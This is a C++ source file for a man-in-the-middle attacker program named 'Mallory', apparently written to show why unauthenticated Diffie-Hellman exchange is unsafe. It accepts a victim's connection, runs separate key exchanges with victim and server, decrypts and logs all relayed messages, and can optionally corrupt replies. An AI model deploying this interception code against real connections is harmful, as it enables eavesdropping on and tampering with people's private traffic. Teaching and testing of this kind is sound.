#include "common.hh"
#include "crypto.hh"
#include <string>
#include <iostream>
#include <cstring>
#include <cerrno>
#include <unistd.h>
#include <thread>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

bool g_tamper = false;

bool hs_to_victim(int vfd, AesKey &key) {
    std::string vbuf;
    if (recv_frame(vfd, vbuf) != 0)
	    return false;
    
    BIGNUM *victim_pub = bn_from_bytes(vbuf);
    BIGNUM *priv, *pub;
    
    dh_generate_keypair(&priv, &pub);
    
    if (send_frame(vfd, bn_to_bytes(pub)) != 0) {
	    BN_free(victim_pub);
	    BN_free(priv);
	    BN_free(pub);
	    return false;
    }

    std::string sec = dh_compute_shared(victim_pub, priv);
    key = derive_key(sec);
    std::cout << "key with VICTIM   fingerprint = " << fingerprint_hex(sec, 8) << "\n";
    
    BN_free(victim_pub);
    BN_free(priv);
    BN_free(pub);
    return true;
}

bool hs_to_server(int sfd, AesKey &key) {
    BIGNUM *priv, *pub;
    dh_generate_keypair(&priv, &pub);
    
    if (send_frame(sfd, bn_to_bytes(pub)) != 0) {
	    BN_free(priv);
	    BN_free(pub);
	    return false;
    }
    
    std::string sbuf;
    
    if (recv_frame(sfd, sbuf) != 0) {
	    BN_free(priv);
	    BN_free(pub);
	    return false;
    }
    
    BIGNUM *server_pub = bn_from_bytes(sbuf);
    std::string sec = dh_compute_shared(server_pub, priv);
    key = derive_key(sec);
    
    std::cout << "key with SERVER   fingerprint = " << fingerprint_hex(sec, 8) << "\n";
    
    BN_free(server_pub);
    BN_free(priv);
    BN_free(pub);
    return true;
}

void relay(int src, int dst, const AesKey &skey, const AesKey &dkey,
                  const std::string &label, bool tamper)
{
    std::string blob, pt, ob;
    while (recv_frame(src, blob) == 0) {
        if (aes_gcm_open(skey, blob, pt)) {
            std::cout << "[CAPTURED " << label << "] " << pt << "\n" << std::flush;
        } else {
            std::cout << "[CAPTURED " << label << "] <undecryptable, dropped>\n" << std::flush;
            continue;
        }
        if (!aes_gcm_seal(dkey, pt, ob))
		break;
        if (tamper && !ob.empty())
		ob.back() ^= 0x01;
        if (send_frame(dst, ob) != 0)
		break;
    }
}

int main(int argc, char **argv)
{
    if (argc < 4) {
        std::cerr << "usage: " << argv[0] << " <listen_port> <server_ip> <server_port> [--tamper]\n";
        return 1;
    }

    int lport = std::stoi(argv[1]);
    std::string sip = argv[2];
    int sport = std::stoi(argv[3]);
    
    if (argc >= 5 && std::string(argv[4]) == "--tamper") g_tamper = true;

    int ls = socket(AF_INET, SOCK_STREAM, 0);
    int yes = 1;
    
    setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof yes);
    
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = INADDR_ANY;
    a.sin_port = htons(lport);
    if (bind(ls, (struct sockaddr *)&a, sizeof a) < 0) {
        std::cerr << "bind: " << strerror(errno) << "\n";
        return 1;
    }
    listen(ls, 4);
    std::cout << "Mallory listening on " << lport << ", forwarding to " << sip << ":" << sport
               << (g_tamper ? " (TAMPER MODE)" : "") << "\n" << std::flush;

    for (;;) {
        struct sockaddr_in ca;
        socklen_t cl = sizeof ca;
        int vfd = accept(ls, (struct sockaddr *)&ca, &cl);
        
	if (vfd < 0)
		continue;
        
	std::cout << "\nMallory's victim connected from " << inet_ntoa(ca.sin_addr) << ":" << ntohs(ca.sin_port) << "\n";

        int sfd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in sa = {0};
        sa.sin_family = AF_INET;
        sa.sin_port = htons(sport);
        inet_pton(AF_INET, sip.c_str(), &sa.sin_addr);
        
	if (connect(sfd, (struct sockaddr *)&sa, sizeof sa) < 0) {
            std::cerr << "connect server: " << strerror(errno) << "\n";
            close(vfd);
            continue;
        }

        AesKey kv{}, ks{};
        if (!hs_to_victim(vfd, kv) || !hs_to_server(sfd, ks)) {
            std::cout << "Mallory handshake failed\n";
            close(vfd); close(sfd);
            continue;
        }
        std::cout << "Mallory's both DH handshakes complete - now relaying (and reading) traffic\n" << std::flush;

        std::thread t1(relay, vfd, sfd, kv, ks, "victim->server", false);
        std::thread t2(relay, sfd, vfd, ks, kv, "server->victim", g_tamper);
        t1.join();
        t2.join();
        close(vfd); close(sfd);
        std::cout << "Mallory's session ended\n";
    }
}
